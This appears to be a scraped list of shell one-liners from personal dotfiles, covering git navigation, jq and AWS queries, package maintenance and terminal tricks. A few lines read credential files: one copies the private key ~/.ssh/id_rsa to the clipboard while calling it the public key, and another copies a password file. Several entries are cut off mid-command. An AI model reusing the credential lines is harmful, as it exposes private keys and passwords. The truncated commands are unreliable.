"curl -s ""http://feeds.delicious.com/v2/json?count=5"" | python -m json.tool | less -R"
"curl -s ""http://checkip.dyndns.org/"" | grep -o ""[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"" | head -1"
"curl -fsS http://ip-api.com/json | python -mjson.tool | jq ""."""
"curl -Ss https://api.forecast.io/forecast/$FORECAST_API_KEY/$(~/Downloads/LocateMe -f {LAT},{LON}) | jq "".minutely.data[].precipIntensity err.txt generated.file succ.txt 1000"" | spark"
"curl -H ""Accept: application/json"" -H ""X-Alertlogic-Identity: 2:15433"" ""http://svc-den-alws.denver.alertlogic.net:8080/api/customer/select?customer_ids=2&fields=child_chain"" | jq "".customers[].child_chain[].customer_id"" | sort -n"
"curl -H ""Accept: application/json"" -H ""X-Alertlogic-Identity: 2:102"" ""http://svc-npt-alws.newport.alertlogic.net:8080/api/customer/select?customer_ids=2&fields=child_chain"" | jq "".customers[].child_chain[].customer_id"" | sort -n"
"curl -H ""Accept: application/json"" -H ""X-Alertlogic-Identity: 2:102"" ""http://svc-dc4a-alws.dc4.alertlogic.net:8080/api/customer/select?customer_ids=2&fields=child_chain"" | jq "".customers[].child_chain[].customer_id"" | sort -n"
"curl -H ""Accept-Language: ru"" wttr.in/""Нижний Тагил?T"" | head -n37 | xargs -0 notify-send"
"curl --silent http://httpbin.org/ip | grep origin | cut -d \"" -f 4"
"curl --silent checkip.dyndns.org | grep --extended-regexp --only-matching ""[0-9\.]+"" | _copy_and_print"
"curl --silent checkip.dyndns.org | ag --only-matching ""[0-9\.]+"" | _copy_and_print"
"curl --connect-timeout 5 www.google.com > /dev/null 2>&1 && echo ""Intenet is up"" || echo ""Internet is down"""
"curl 'https://api.coinmarketcap.com/v1/ticker/?convert=CNY&limit=10' 2>/dev/null | jq '.[] | {rank: .rank, id: .id, cny: .price_cny, usd: .price_usd, h24: .percent_change_24h, d7: .percent_change_7d, cap_cny: .market_cap_cny}'"
"cups-lpq | sort +0 +1 | swrite 16,5,16,64,24 0"
"ctags `find . -name ""*.php"" | grep -vE ""vendor|PHPExcel""` --links=no "
"ctags -R $(git rev-parse --show-toplevel || echo ""."")"
"cpugov && for ((n=0; n<""`cpufreq-info | grep ""analyzing"" | wc -l`""; n++)); do sudo cpufreq-set -g performance -c $n -r; done && cpugov"
"cpufreq-info | grep -E ""current CPU | speed"" \
"cpp -dM /usr/include/errno.h | grep ""define E"" | sort -n -k 3"
"cp -r . ../""$(basename ""$PWD"")""-copy""$(ls .. | grep ""$(basename ""$PWD"")-copy"" | wc -l)"""
"cowsay -f ""$(ls /usr/share/cowsay/cows/ | sort -R | head -1)"" ""$(fortune -s)"""
"coredumpctl gdb -q $(coredumpctl -r -1 | sed -E -e ""s/ +/\n/g"" | sed -n ""12p"")"
"convert `find $LOLCOMMITS_DIR/. -type f -name ""*.jpg"" -print0 | xargs -0 ls -tlr | awk "
"confirm ""Restart the Dock?"" ""y"" && killall Dock && echo ""done!"" || echo ""Bye then..."""
"conda activate $(less environment.yml | grep ""name:"" | cut -d"" "" -f2)"
"command pwd | tee >(tr -d ""\n"" | pbcopy)"
"command ps -eo ""%p %r"" | command grep -v grep | command grep --color=never"
"command infocmp -1 | command sed -nu 's/^[ \000\t]*//;s/[ \000\t]*$//;/[^ \t\000]\{1,\}/!d;/acsc/d;s/=.*,//p'|column -c80"
"comm -23 <(find /{etc,usr,var} \( -path /etc/\*cert\* -o -path /usr/share/mime -o -path /var/\*/\*man \) -prune -o -type d -printf %p/\\n -o -print 2>/dev/null | sort) <(pacman -Qlq | sort -u)"
"code -g $(rg --column --line-number --no-heading --smart-case . | fzf | rg -o "".*:\d+:\d+"")"
"code ""$(configurator -g workspacePath)\deployment\Release $(git branch | grep \* | cut -d "
"co `git branch | percol | sed -e ""s/^\*[ ]*//g""`"
"clear;tail -10000f | grep -v com.alu.cna.cloudmgmt.common.core.xmpp.debugger.XmppClientCustomDebugger /opt/vsd/logs/install.log | egrep -v ""^$"""
"clear; while true; do (( RANDOM % 2 )) && echo -ne ""\e[3$(( $RANDOM % 8 ))m╱"" || echo -n ╲; sleep .07; done"
"clear; [[ -z ""$TMUX"" ]] && tls 2>/dev/null || true"
"clear && tree -I ""venv*|__pycache__*|coverage*"""
"clear && printf ""\n"" && date && printf ""\n"" && cal | grep --color -EC6 ""\b$(date +%e | sed ""s/ //g"")"""
"clear && git diff --name-only --diff-filter=d origin/master | grep -E ""js(x)?$"" | xargs npx eslint"
"clear && coverage run --source ""${PWD##*/}"" -m unittest discover && coverage report -m || python -m unittest discover"
"clear && clear && export VCAP_APP_HOST=""0.0.0.0"" && node app.js || notify-send NodeJS ""crashed"""
"cisco status | sed -n -e ""/Disconnected.*/p"" -e ""/Connected.*/p"" -e ""/Reconnecting.*/p"" | sed -n ""1p"""
"chgrep trello | awk ""{print $1}"" | xargs chtab"
"check_up | grep "" 0"" | wc -l"
"check-system.sh 2>&1 | tee ~/check.log | grep ""NOT OK"""
"cf push | awk \""{ print $NF }\"" | xargs open -a /Applications/Google\ Chrome.app"
"cf logs $(cf apps|cut -d "" "" -f 1|fzf)"
"cdf -h | grep -vP ""(none|backup)"""
"cd_log;tail -f apps.out | grep -n ""ERROR"" | grep -v ""INFO \[Lix\]"""
"cd_log;cat apps.out | grep -n ""ERROR"" | grep -v Lix"
"cd ~/workspace/wlw/docker-compose && docker rmi -f $(docker images -a | grep ""^<none>"" | awk ""{print $3}"")"
"cd ~/codebase; for x in *; do echo $x; cd $x && git pull 2> >(while read line; do echo -e ""\e[01;31m$line\e[0m"" >&2; done) || true && cd ..; done;"
"cd ~/HW1/usr/toukmond ; echo -n ""Your inventory contains: "" ; echo $(ls *.o 2> ~/_ ) 2> ~/_ || echo """" ; cd - >& ~/_ ; ig"
"cd ~/.ssh; for f in !(*.pub|*.pem|known_hosts); do
"cd ~/.bash/ && tree -aIF '.git*|.DS_Store|*.swp' && echo 'NOTE: .git, .gitignore, .DS_Store & .swp hidden from tree '"
"cd `svn info | grep ""Working Copy"" | cut -d "
"cd `find . -maxdepth 1 -type d | sed -e ""s;\./;;"" | peco --prompt ""CHANGE DIRECTORY PATH>""`"
"cd \$(git rev-parse --show-toplevel || echo ""."")"
"cd /usr/share/icons/gnome/scalable && find . -maxdepth 1 -exec basename ""{}"" \; | xargs | sed ""s/\. //g"""
"cd /media/data && ls -l -t -h --reverse || /run/user/1000/gvfs/smb-share:server=192.168.1.200,share=data && ls"
"cd /Users/Hierro/dev/git/agaro1121.github.io && ls -A | grep -vx .git | xargs rm -rf && rm -rf /Users/Hierro/dev/git/agaro1121.github.io.raw && get git@github.com:agaro1121/agaro1121.github.io.git /Users/Hierro/dev/git/agaro1121.github.io.raw &&cd /Users/Hierro/dev/git/agaro1121.github.io.raw && gp && bundle exec jekyll build && cp -r _site/* /Users/Hierro/dev/git/agaro1121.github.io/ && cd /Users/Hierro/dev/git/agaro1121.github.io && touch .nojekyll && git add . && git commit -am ""converts to flat HTML"" && git push origin master"
"cd .w >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd .sw >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd .se >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd .s >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd .nw >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd .e >& ~/_ && see || echo ""You cannot go that way."" ; ig"
"cd ..; rmdir ""$OLDPWD"" || cd ""$OLDPWD"""
"cd -""$(dirs -v | rofi -dmenu | cut -f1 )"""
"cd +""$(dirs -v | peco | cut -f 1)"""
"cd $SPI_DIR/LibTkGL/TclGeoEER ; /usr/bin/autoconf2.50 || echo ""spireconf failed"" ; cd - >/dev/null"
"cd $NOTES && vim `find . -name ""*.md"" | sort | fzf --preview ""cat {}""`"
"cd $GOPATH/src/`find $GOPATH/src -name .git -type d -maxdepth 4 -exec dirname {} \; | perl -pe ""s{^$GOPATH/src/}{}"" | peco`"
"cd $1 && `find . -name ""*.[h|c]""` | xargs etags && cd -"
"cd $(z | tail -1 | sed -e ""s/^[^ ]* *//"")"
"cd $(yadm rev-parse --show-toplevel || echo ""."")"
"cd $(svn info | grep ""Working Copy Root Path:"" | sed ""s/.*://"")"
"cd $(pwd | sed -e""s,google3,review/$(git symbolic-ref HEAD | sed -e"
"cd $(mktemp -d 2>/dev/null || mktemp -d -t ""mytmpdir"")"
"cd $(ls -p | grep ""/"" | tail -1)"
"cd $(list-projects | fzf | sed ""s#~#$HOME#"")"
"cd $(git-root || echo ""."")"
"cd $(git submodule status | sed ""s/^.//"" | cut -d"" "" -f2)"
"cd $(git rev-parse --show-toplevel) || echo ""not a git project directory"""
"cd $(git rev-parse --show-toplevel || echo \"".\"")"
"cd $(git rev-parse --show-toplevel || echo ""."")"
"cd $(git rev-parse --show-toplevel 2>/dev/null || (echo "".""; echo ""Not within a git repository"" >&2))"
"cd $(git rev-parse --show-toplevel 2> /dev/null || echo -n ""."")"
"cd $(git rev-parse --show-toplevel 2> /dev/null || echo ""$(pwd)"") && echo ""$_"""
"cd $(git rev-parse --show-toplevel 2> /dev/null || builtin print ""."")"
"cd $(git rev-parse --show-cdup || echo ""."")"
"cd $(ghq list|fzf|xargs -Irepo echo ""$(ghq root)/repo"")"
"cd $(find . -name ""*$(git branch | grep \* | cut -d "
"cd $(find -L ~/Dropbox ~/Documents ~/Videos -type d 2> /dev/null | grep -v ""/\."" | dmenu -i -l 10)"
"cd $(fasd -l | fzf -e -i --tac --no-sort --preview ""tree -L 4 -d -C --noreport -C {} | head -200"" )"
"cd $(conda info | grep ""active env location"" | cut -d: -f2-)/lib/python3.6/site-packages"
"cd ""`xclip -o`"" || exit"
"cd ""`git rev-parse --show-toplevel || echo /dev/null`"" 2>/dev/null"
"cd ""`/bin/pwd 2>/dev/null || pwd`"""
"cd ""`/bin/pwd -P 2>/dev/null || pwd`"""
"cd ""`/bin/pwd -P 2>/dev/null || /bin/pwd`"""
"cd ""/Volumes/Time Capsule"" && { ls -1 *.mp4 | cut -d _ -f 1 | gawk "
"cd ""$WORKON_HOME/$(pwd | rev | cut -d "
"cd ""$(z | cut -c 12- | fzf)"""
"cd ""$(printf ""$PWD"" | rev | cut -d "
"cd ""$(lsdir | randomline $(lsdir | wc -l))"""
"cd ""$(git-root || print .)"""
"cd ""$(git worktree list | fzf | cut -f 1 -d "" "")"""
"cd ""$(git rev-parse --show-toplevel || pwd)"""
"cd ""$(git rev-parse --show-toplevel || echo .)"""
"cd ""$(find . -type d|grep -v ""\/\.""|peco)"""
"cd ""$(find . -type d | grep -v ""\/\."" | peco)"""
"cd ""$(eval fpwd)"" || exit 0"
"cd ""$(echo $PWD | sed ""s_/Books/_/BooksComp/_"" | sed ""s_/Comedy/_/ComedyComp/_"")"""
"cd ""$(dotcfg rev-parse --show-toplevel || echo .)"""
"cd ""$(dirs -lp | sort -u | fzf)"""
"cd ""$( _z -l 2>&1 | fzf -s --tac | sed "
"cbc || echo ""Installing newly added gems..."" && bi"
"cbc || (echo ""Installing newly added gems..."" && bi) && be"
"cat ~/.zsh/.zhistory | sed ""s/[^;]\+;//"" | awk"
"cat ~/.zprezto/modules/git/alias.zsh | grep ""alias "" | grep"
"cat ~/.tmux/SCRATCH_PAD | grep --color=never ""panes on"" | pbcopy"
"cat ~/.ssh/known_hosts | sed ""/10.46/d"" > ~/.ssh/tmp_known_hosts;cat ~/.ssh/tmp_known_hosts | sed ""/-dr1/d"" > ~/.ssh/tmp2_known_hosts;mv ~/.ssh/tmp2_known_hosts ~/.ssh/known_hosts"
"cat ~/.ssh/known_hosts | sed ""/10.36/d"" > ~/.ssh/tmp_known_hosts;cat ~/.ssh/tmp_known_hosts | sed ""/-dr1/d"" > ~/.ssh/tmp2_known_hosts;mv ~/.ssh/tmp2_known_hosts ~/.ssh/known_hosts"
"cat ~/.ssh/id_rsa.pub |pbcopy |echo ""Public key copied to clipboard."""
"cat ~/.ssh/id_rsa.pub | tr -d ""\n"" | pbcopy; echo ""~/.ssh/id_rsa.pub copied to clipboard."""
"cat ~/.ssh/id_rsa.pub | tr -d ""\n"" | pbcopy && echo ""Your public key is now in your Clipboard"""
"cat ~/.ssh/id_rsa | tr -d ""\n"" | pbcopy && echo ""Your public key is now in your Clipboard"""
"cat ~/.ssh/config|grep ""Host\s""|sed ""s/Host /ssh /g"""
"cat ~/.ssh/config| grep ""Host "" | sed -e ""s/Host //g"""
"cat ~/.ssh/config | grep ""host\ "" | sed -e ""s/^[ \t]*host//"""
"cat ~/.ssh/config | grep ""^Host\ ""| sed ""s/Host //g"""
"cat ~/.pw | tr -d ""\r\n"" | pbcopy"
"cat ~/.bashrc | grep ""alias l.*=.ls"" | grep ^alias"
"cat ~/.bashrc | grep ""alias l.*=.ls"" | grep ^a"
"cat ~/.bashrc | grep ""alias .*grep=.find"" | grep ^alias"
"cat ~/.bashrc | grep ""^alias"" | gsed -En ""s/alias (\w+)=(.+)/${bold}\1\n ${normal}\2\n/p"""
"cat ~/.bash_history | grep -v ""search_history"" | grep $1"
"cat | tr '\n' ',' | sed -e 's/.$//g'"
"cat httpd.conf | grep -v ""#"" | more"
"cat domibus/domibus-parametric-pmode.xml | sed s/\$\{name\}/blue_gw/g | sed s/\$\{connectorPartyId\}/tc.freedonia.toop/g > domibus/domibus-blue-pmode.xml; \
"cat docker-compose.yml|python -c 'import sys, yaml, json; print(json.dumps(yaml.load(sys.stdin.read())))'|jq "
"cat \$1| grep -v $LHOST| grep -v ""chocolatine ;#"""
"cat Gemfile | ack ""^ *gem.*"" | sort"
"cat <(cat ~/.ssh/id_rsa.pub | xargs echo -n) <(printf "" $USER"") | pbcopy"
"cat /var/log/pacman.log | fgrep ""[ALPM] upgraded"" | tail -100"
"cat /var/lib/misc/dnsmasq.leases | egrep -v ""ibuild|192.168.1."""
"cat /usr/share/dict/words|grep -v ""[^A-Za-z]s""|tpope page egrep -i"
"cat /usr/share/dict/british | sed -r -n '/^.{5,10}$/p' | sed \"
"cat /usr/local/etc/php/7.0/conf.d/ext-xdebug.ini | sed -e ""s/xdebug.default_enable = 1/xdebug.default_enable = 0/"" | sed -e ""s/xdebug.remote_enable = 1/xdebug.remote_enable = 0/"" > /tmp/ext-xdebug.ini.tmp; mv /tmp/ext-xdebug.ini.tmp /usr/local/etc/php/7.0/conf.d/ext-xdebug.ini"
"cat /usr/local/etc/php/7.0/conf.d/ext-xdebug.ini | sed -e ""s/xdebug.default_enable = 0/xdebug.default_enable = 1/"" | sed -e ""s/xdebug.remote_enable = 0/xdebug.remote_enable = 1/"" > /tmp/ext-xdebug.ini.tmp; mv /tmp/ext-xdebug.ini.tmp /usr/local/etc/php/7.0/conf.d/ext-xdebug.ini"
"cat /usr/local/etc/php/5.6/conf.d/ext-xdebug.ini | sed -e ""s/xdebug.default_enable = 1/xdebug.default_enable = 0/"" | sed -e ""s/xdebug.remote_enable = 1/xdebug.remote_enable = 0/"" > /tmp/ext-xdebug.ini.tmp; mv /tmp/ext-xdebug.ini.tmp /usr/local/etc/php/5.6/conf.d/ext-xdebug.ini"
"cat /usr/local/etc/php/5.6/conf.d/ext-xdebug.ini | sed -e ""s/xdebug.default_enable = 0/xdebug.default_enable = 1/"" | sed -e ""s/xdebug.remote_enable = 0/xdebug.remote_enable = 1/"" > /tmp/ext-xdebug.ini.tmp; mv /tmp/ext-xdebug.ini.tmp /usr/local/etc/php/5.6/conf.d/ext-xdebug.ini"
"cat /tmp/docker-build-out | tail -n1 | awk ""{print $3}"" > /tmp/last-container && sudo docker run -it ""$(cat /tmp/last-container)"" /bin/bash"
"cat /proc/sys/kernel/random/uuid | sed s/-//g | tr ""a-z"" ""A-Z"""
"cat /proc/cpuinfo| grep ""processor""| wc -l"
"cat /proc/cpuinfo | grep ""model name"" | head -1; sensors;"
"cat /proc/cpuinfo | grep ""^model name"" | uniq"
"cat /home/y/logs/yapache/hk/access /home/y/logs/yapache/hk/access.[1-255] | readlog -f url |grep ""bid_hist$"""
"cat /etc/passwd | grep ""/bin/bash"" | cut -d "
"cat /etc/passwd | awk -F "":"" ""{if(\$3 > 999) print}"" | column -ts:"
"cat /etc/mtab | grep -Ev ""^#"" | column -t"
"cat /etc/monitrc | grep -v ""^#"" | grep include"
"cat /etc/fstab | grep -Ev ""^#"" | column -t"
"cat /etc/ansible/hosts | grep ""^\["" | sed "
"cat /etc/`ls /etc -F | grep ""release$\|version$""`"
"cat /dev/urandom | xxd | grep --color=never --line-buffered ""be ef"""
"cat /dev/urandom | tr -dc ""A-Za-z0-9\-_"" | head -c"
"cat /dev/urandom | tr -dc ""0-9"" | head -c"
"cat /dev/urandom | tr -cd ""a-f0-9"" | head -c 32"
"cat /dev/urandom | tr -cd ""[:alnum:]"" | head -c 15; echo """""
"cat /dev/urandom | hexdump | sed -E ""s/([A-Fa-f0-9])([A-Fa-f0-9]{6}) (.*)/\1x\2: \3 /g"""
"cat /dev/urandom | hexdump -C | rg ""ca fe"""
"cat /dev/urandom | hexdump -C | grep --color=auto ""ca fe"""
"cat /dev/urandom | hexdump -C | grep --color ""ca fe"""
"cat /dev/urandom | hexdump -C | grep ""ca fe"""
"cat /dev/urandom | hexdump -C | grep ""ca fe"" "
"cat /dev/urandom | hexdump -C | grep ""be ef"""
"cat /dev/urandom | hexdump -C | grep ""[[:alpha:]]\{2\}"""
"cat /dev/urandom | hexdump -C | egrep ""ca fe"""
"cat /dev/urandom | hexdump -C | \grep ""ca fe"""
"cat /dev/urandom | hexdump -C |
"cat /dev/urandom | LC_CTYPE=C tr -dc ""[:alnum:]"" | head -c"
"cat /dev/random | hexdump -C | grep 'ca fe'"""
"cat .sleep 2> ~/X || \
"cat .routes | peco --prompt ""RAILS ROUTES>"" | awk "
"cat .git/COMMIT_EDITMSG | ag --invert-match ""^\#.*"" | pbcopy"
"cat .csshrc | tail -n 1 | awk -F""="" \"
"cat *xcep* | grep -v ""^;"" |less"
"cat *rro* | grep -v ""^;"" | less"
"cat *ass* | grep -v ""^;"" |less"
"cat *UNC.txt |sort -nu |grep -v ""^;"" > all-TD-UNC.txt"
"cat *FNP* | grep -v ""^;"" | less"
"cat err.txt generated.file succ.txt | sed -r ""s/Title: /\n\n--------------------\nTitle: /g"" | less"
"cat ${HOME}/.ssh/id_rsa.pub | tr -d ""\n"" | xclip -selection clipboard && echo ""SSH public key coppied to clipboard"""
"cat $zshrc_auth_log_path | grep ""sshd.*Invalid"" | more"
"cat $zshrc_auth_log_path | grep ""sshd.*Accepted"" | more"
"cat $HOME/scripts/gupy/gupy-repos.csv | sed -e ""s/,/\t/g"" | xargs -L1 $HOME/scripts/gupy/gupydate.sh"
"cat $HOME/.cache/neomru/{file,directory} | peco | xargs vim"
"cat $FONTLIST | awk '{gsub(/fa-|;/, \"
"cat $CONECTA_DIR/Benner.Conecta.Portal/packages.config | grep -oP ""Benner.Infra\""\s*version=\""[^\""]+\"""" | grep -oP ""[0-9][^\""]+"""
"cat $1 | egrep -v ""(^#.*|^$)"""
"cat $(git rev-parse --show-toplevel || echo ""."")/.git/config"
"cat ""${__BASH_ALIASES}"" | grep -E ""^alias\b"" --color=never | sed -E ""s/^alias //"""
"cat ""$@"" | sed -r ""s/\x1B\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g"""
"cat ""$(ls | cut -f1 | head -n1)"""
"cancel `lpstat | cut -d ""-"" -f2 | cut -d ""j"" -f1`"
"cal_head=`cal | head -1`; cal_tail=`cal | tail -7`; today=`date ""+%e""`; echo ""$cal_head""; echo -en ""${cal_tail/${today}/\033[1;33m${today}\033[0m}"";"
"cal | sed ""s/^/ /;s/$/ /;s/ $(date +%e) / $(date +%e | sed "
"cal | grep -E --color ""\b`date +%e`\b|$"""
"cal | grep --color -EC6 ""\b$(date +%e | sed ""s/ //g"")"""
"cal | grep --color -EC6 ""\b""(date +%e | sed ""s/ //g"")"
"cal | grep --color -EC6 ""\b""$(date +%e | sed ""s/ //g"")"
"cal | ag --passthrough ""\b$(date +%e | sed ""s/ //g"")\b"""
"cal -3 | grep -E --color ""\b`date +%e`\b|$"""
"c; git grep -EI ""TODO|FIXME|BUG"""
"c:/windows/system32/ipconfig | grep ""IP Address"" | awk ""{ print \$15 }"""
"c2p|bc -i -l -q| sed -e 'y/,./.,/'"
"c-src | xargs -d ""\n"" cat | wc -l"
"c && echo """" && echo ""Sorted by Company"" && cycle 1st clients | sort -k1 && echo """" && echo ""Descending Sort By Rank Tracker Terms"" && cycle 1st clients | sort -nrk3"
"c && echo """" && echo ""Sorted by Company"" && cycle 15th clients | sort -k1 && echo """" && echo ""Descending Sort By Rank Tracker Terms"" && cycle 15th clients | sort -nrk3"
"bundle show --paths | sed ""s+$PWD/++"" | xargs grep --recursive --line-number"
"bundle show --paths | sed ""s+$PWD/++"" | xargs grep --recursive --line-number --"
"bundle list | tr -d '*(,)' | awk '{print $1, \"
"bundle exec ruby -I.:test -e ""ARGV.each{|f| require f}"""
"bundle exec ruby -I.:test -e ""ARGV.each { |f| require f }"""
"bundle exec pry -r `test -f config/environment.rb && echo ""./config/environment"" || echo ""./config/boot""`"
"bundle check || bundle install --local --quiet && echo ""Bundle complete"""
"bubblegum upload ""$(/bin/ls -d1t ~/images/scrots/* | head -n1 | tr -d \""\\n\"")"""
"brewup && brew cask outdated | awk ""{print $1}"" | xargs brew cask reinstall && brew cask upgrade"
"brew update&&brew cask outdated|cut -d""("" -f1|xargs brew cask reinstall&&brew cask cleanup"
"brew outdated --verbose | sed 's#[<()]##g; s#\S*, ##g' | column -t"
"brew list | while read cask; do echo -n $fg[blue] $cask $fg[white]; brew deps $cask | awk '{printf("" %s "", $0)}'; echo """"; done"
"brew list | while read cask; do echo -en ""\e[33m $cask \e[31m""; brew deps $cask | awk "
"brew list -1 | while read cask; do echo -ne ""\x1B[1;34m $cask \x1B[0m""; brew uses $cask --installed | awk "
"brew list -1 | grep -v grep | grep ""$@"""
"brew info --json=v1 --installed | jq ""map(select(.keg_only == true and .linked_keg != null) | .name)"""
"brew cask reinstall `brew cask outdated | awk ""{print $1}""| paste -s -d "" "" -`"
"brew cask outdated | cut -d "" "" -f 1 | xargs brew cask install --force"
"brew cask outdated --verbose | sed 's#[!=<()]##g; s#\S*, ##g' | column -t"
"brew cask outdated --greedy | awk -F""\s"" ""{print $1}"" | xargs brew cask upgrade && brew cleanup"
"brew cask list | xargs brew cask info | grep -B3 ""Not installed"""
"branch_name=""$(git symbolic-ref HEAD 2>/dev/null)"" || branch_name=""(unnamed branch)""; branch_name=${branch_name##refs/heads/}; gom; gp; go $branch_name; gmm"
"branch=$(gitb | fgrep ""*"" | cut -d "" "" -f2) && git checkout master && gitp && git checkout $branch && git merge master && unset branch"
"branch=$(git branch | grep ""\*"" | awk ""{ print \$2 }""); git push --set-upstream origin $branch"
"branch=$(git branch | grep ""*"" | awk "
"branch=$(git br | grep ""*"" | cut -d "" "" -f 2) && git co master && git svn rebase && git co $branch && git rebase master && git glog"
"br list | awk ""{print \$2}"" | grep ec2- > ~/ansible_hosts"
"bitcoin-cli listunspent | jq -r '.[] | { txid: .txid, vout: .vout, amount: .amount }'"
"bindkey | highlight --out-format=""truecolor"" --syntax=""conf"" --style=anotherdark | env LESS= less -JRMXs"
"bind -P |vim -i NONE ""+setl bt=nofile |setf text"" -c ""nnoremap q :q<Enter>"" -"
"beep; notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || \
"beep ; test -z ""$DISPLAY"" || xclock -geom 500x500+0+0"
"be rubocop $(git ls-files -m | xargs ls -1 2>/dev/null | grep ""\.rb$"")"
"bat || echo ""[INFO] https://github.com/sharkdp/bat is not installed"""
"az vm start --resource-group ${resourceGroup} --name ${vmName} && export instanceId=`az vm list-ip-addresses --name ${vmName} | jq .[].virtualMachine.network.publicIpAddresses[0].ipAddress | tr -d \""`;echo $instanceId"
"aws sqs list-queues | jq .QueueUrls[] | tr -d ""\"""""
"aws emr list-clusters --active | jq -r "".Clusters[] | {Id: .Id, Name: .Name, State: .Status.State, InstanceHours: .NormalizedInstanceHours}"""
"aws eks get-token --cluster-name roc-$1 | jq -r "".status.token"" | pbcopy"
"aws ec2 disassociate-address --association-id $associationId && aws ec2 describe-addresses | awk ""{print \$2}"" | xargs -n 1 aws ec2 release-address --allocation-id"
"aws ec2 describe-instances | jq -r '.Reservations[].Instances[] | [.InstanceId, .PrivateIpAddress, .InstanceName, .PublicIpAddress, .State.Name ]'"
"aws ec2 describe-instances | jq -r "".Reservations[].Instances[] | select(.InstanceId==\""i-017b9946a248a7679\"")"""
"aws ec2 describe-instances | jq '.Reservations[].Instances[] | {InstanceId, State, PublicIpAddress, PublicDnsName}'"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[PublicIpAddress,Tags[?Key==\`Name\`].Value[]]' --filters 'Name=tag:Name,Values=*' --output text | sed '$!N;s/\n/\t/'|grep -v None"
"aws ec2 describe-instances --query 'Reservations[].Instances[].[PrivateIpAddress,Tags[?Key==\`Name\`].Value[]]' --filters 'Name=tag:Name,Values=*' --output text | sed '$!N;s/\n/ /'|grep -v None"
"aws ec2 describe-instances --filters Name=instance.group-name,Values=*gmorini* | grep -e KeyName -e PublicIpAddress -e InstanceId -e \""Name\"" -e ""^ {$"" -e ""^ }""| grep -v \""Key\"""
"aws ec2 --region ${jl_region} describe-instances --filters --query 'Reservations[].Instances[].[PrivateIpAddress,InstanceId,Tags[?Key=='Name'].Value[]]' --output text | sed 's/None$/None\n/' | sed '$!N;s/\n/ /'"
"aws batch describe-job-queues | jq '.jobQueues[] | {jobQueueName, jobQueueArn}'"
"aws autoscaling describe-auto-scaling-groups | jq '.AutoScalingGroups[] | ""\(.AutoScalingGroupName) - \(.MinSize) - \(.DesiredCapacity)""'"
"aws --profile ${project} rds describe-db-instances | jq '.DBInstances[] | {name: .DBInstanceIdentifier, type: .DBInstanceClass, storage: .AllocatedStorage, storagetype: .StorageType}'"
"aws --profile ${project} elasticache describe-cache-clusters | jq '.CacheClusters[] | {name: .CacheClusterId, type: .CacheNodeType}'"
"aws --profile ${project} ec2 describe-instances | jq '.Reservations[].Instances[] | {name: .Tags[].Value, type: .InstanceType, public_ip: .PublicIpAddress}'"
"awk '{x = length(\$0); print x, \$0}' | sort -n | sed 's/^[0-9][0-9]* //'"
"awk '{print \$NF,\$0}' ~/todo.txt-cli/someday_maybe.txt | sort -nr | cut -f2- -d' ' > ~/todo.txt-cli/someday_maybe.txt.back ; mv -f ~/todo.txt-cli/someday_maybe.txt{.back,}"
"awk '{print \$NF,\$0 }' | sort -nr | cut -d ' ' -f 2-"
"awk '{ print length, $0 }' | sort -n -s --reverse | cut -d' ' -f2-"
"awk ""{print length, \$0}"" | sort -n | awk ""{\$1=\""\""; print substr(\$0,2,length-1) }"""
"awk ""{gsub(/^|$/,\""@\"",\$2);sub(/^/,\""@\"",\$7);print}"" | awk -F@ ""{print \$2, \$4}"""
"awk ""{ if (!min || \$0 < min) { min = \$0; }; if (\$0 > max) { max = \$0; }; } END { print min; print max; }"""
"awk ""/scripts/,/}/"" package.json | ack -v ""\s\s}"" | ack -v ""\s\s\""scripts\"":"""
"awk ""$3~/^install$/ {print$4}"" /var/log/dpkg.log | tail -n 22 | cut -d "":"" -f1"
"auscult -a 127.0.0.1:1234 2>/dev/null & tmux rename-window irc; ssh home -R 127.0.0.1:1234:127.0.0.1:1234 -t ""TERM=screen-256color; tmux -q2 attach -t irc || tmux -2 new-session -s irc irssi""; tmux set-window-option -q automatic-rename ""on"" >/dev/null"
"auracle sync | cut -f1 -d "" "" | xargs -n 1 auracle clone"
"assume-role prod ReadOnly && ec2-instances | grep WebApp | grep -v ',$'"
"askto ""delete all local git branches except master"" ""git branch | grep -Ev master | xargs -n 1 git branch -D"""
"arp -n | sort | grep ""1\."""
"arp -a | grep d8:50:e6 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'"
"arp -a | grep b8:27:eb | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'"
"arp -a | grep a6:24:39 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'"
"arecord -f cd -t raw | oggenc - -r -o $HOME/out_audio.ogg & ffmpeg -f x11grab -s $(xrandr | awk '/, current /{ gsub(/\,/,"
"aptitude -o ""Aptitude::Pkg-Display-Limit=~i !~M ( ?reverse-depends(~i) | ?reverse-recommends(~i) | ?reverse-suggests(~i) ) !?essential"""
"aptitude -o ""Aptitude::Pkg-Display-Limit=( `apt-show-versions | fgrep newer | awk "
"apt-mark showmanual | egrep ""linux-.*[0-9]"" && sudo apt-mark auto $(apt-mark showmanual | egrep ""linux-.*[0-9]"") && sudo apt-get autoremove --purge"
"apt-history | awk ""/Commandline/&&/install/{print}"" | apt-history-filter"
"apt-get update 2> /tmp/keymissing; for key in $(grep ""NO_PUBKEY"" /tmp/keymissing |sed ""s/.*NO_PUBKEY //""); do echo -e ""nProcessing key: $key""; gpg --keyserver subkeys.pgp.net --recv $key && gpg --export --armor $key | apt-key add -; done"
"apt-get -V remove --purge $(ls /var/cache/apt/archives | grep "".deb"" | cut -d ""_"" -f 1)"
"apt-cache pkgnames | fzf --header ""[apt:install]"" | xargs -d "" "" -- sudo apt-get install"
"apt list -i 2> /dev/null | grep ""local]$"" | cut -d "
"application=$(ls -1 /Applications | sed ""s/.app//"" | fzf) && open -a ${application}.app"
"apachectl status | grep -E ""Version|uptime"""
"apache2ctl -M | grep ""_"" | sort"
"ansible $1 -m shell -a ""ps -elf | head -1; ps -elf | awk "
"amixer sget ""Master"" | tail -n1 | perl -n -e""/(\d+\%)/ && print $1"""
